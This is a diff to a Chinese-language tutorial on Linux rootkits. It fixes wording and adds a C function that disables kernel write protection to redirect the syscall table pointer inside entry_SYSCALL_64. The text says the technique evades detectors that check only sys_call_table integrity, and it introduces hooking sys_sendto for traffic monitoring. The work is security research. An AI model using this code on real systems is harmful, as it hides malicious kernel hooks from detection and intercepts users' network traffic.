@@ -2290,7 +2290,7 @@ rectigu@gmail.com ， 二〇一六年七月。
 Linux Rootkit 系列六：基于修改派遣例程的系统调用挂钩
 ====================================================
 
-**最后修改时间** ： **2016-07-24 CST** 。
+**最后修改时间** ： **2016-07-25 CST** 。
 
 rectigu@gmail.com, 二〇一六年七月。
 
@@ -2422,7 +2422,7 @@ https://github.com/NoviceLive/research-rootkit。
 我们使用 ``ff 14 c5`` 作为特征字节搜索
 ``entry_SYSCALL_64`` 的机器码，
 然后读出 4 个字节的 ``sys_call_table`` 的地址，
-符号拓展到 64 比特，
+符号拓展到 64 比特：
 因为它的符号位是 1，我们可以简单的将高 32 比特补成 1 就好了。
 
 请看代码。
@@ -2479,7 +2479,7 @@ https://github.com/NoviceLive/research-rootkit。
 通过 `基于修改 sys_call_table 的系统调用挂钩`_
 中的方法拿到的 ``sys_call_table`` 的地址是
 ``ffff8800016001a0`` ，
-而从 entry_SYSCALL_64 中拿到的 ``sys_call_table`` 的地址是
+而从 ``entry_SYSCALL_64`` 中拿到的 ``sys_call_table`` 的地址是
 ``ffffffff816001a0`` 。
 
 为什么这两个值不一致呢？
@@ -2504,7 +2504,32 @@ https://github.com/NoviceLive/research-rootkit。
 
 有了第 3 小节中实现的 ``get_lstar_sct_addr`` ，
 要修改或者恢复 ``entry_SYSCALL_64`` 中的 ``sys_call_table``
-并不复杂。
+并不复杂。下面是 ``set_lstar_sct`` 的实现。
+
+.. code-block:: c
+
+   int
+   set_lstar_sct(u32 address)
+   {
+       unsigned long *lstar_sct_addr = get_lstar_sct_addr();
+       if (lstar_sct_addr != NULL) {
+           u8 *arr = (u8 *)lstar_sct_addr;
+           u8 *new = (u8 *)&address;
+
+           fm_alert("%02x %02x %02x %02x\n",
+                    arr[0], arr[1], arr[2], arr[3]);
+           fm_alert("%02x %02x %02x %02x\n",
+                    new[0], new[1], new[2], new[3]);
+
+           disable_wp();
+           memcpy(lstar_sct_addr, &address, sizeof address);
+           enable_wp();
+
+           return 0;
+       } else {
+           return 1;
+       }
+   }
 
 修改
 ****
@@ -2533,7 +2558,7 @@ https://github.com/NoviceLive/research-rootkit。
    // 所以，我们需要使用形如 0xffffffffXXXXXXXX 的地址，
    // 这样可以借助符号拓展。
    // 静态分配可以得到这种地址，至于为什么请看模块映射空间的地址范围。
-   u64 fake_sct[__NR_syscall_max] = { 0 };
+   u64 fake_sct[__NR_syscall_max + 1] = { 0 };
 
    // 把代码放到一个 /proc 文件的写处理函数里
    // 是为了在内核调试的时侯方便下断点。
@@ -2600,7 +2625,7 @@ https://github.com/NoviceLive/research-rootkit。
 **请注意顺序！**
 
 卸载 ``setko`` 之前，需要确保已经恢复到原来的值；
-否则，机器将不能正常运行。
+否则，机器将不能继续运行。
 
 5. 比较
 +++++++
@@ -2612,14 +2637,14 @@ https://github.com/NoviceLive/research-rootkit。
 而真的 ``sys_call_table`` 完好无损。
 
 因而，对于那些只检测 ``sys_call_table`` 完整性
-而不检查派遣例程完整性的检测逻辑，本文的方法是躲过检测的。
+而不检查派遣例程完整性的检测逻辑，本文的方法是可以躲过检测的。
 
 第二部分：基于系统调用挂钩的初级流量监视
 ----------------------------------------
 
 监视本机发出去的数据包。
 考虑到 ``sys_send`` 是用 ``sys_sendto`` 实现的，
-我们只钩 ``sys_sendto`` 就好了。
+所以我们只钩 ``sys_sendto`` 就好了。
 
 1. 伪造假的 ``sys_call_table`` 并钩调其中的 ``sys_sendto``
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
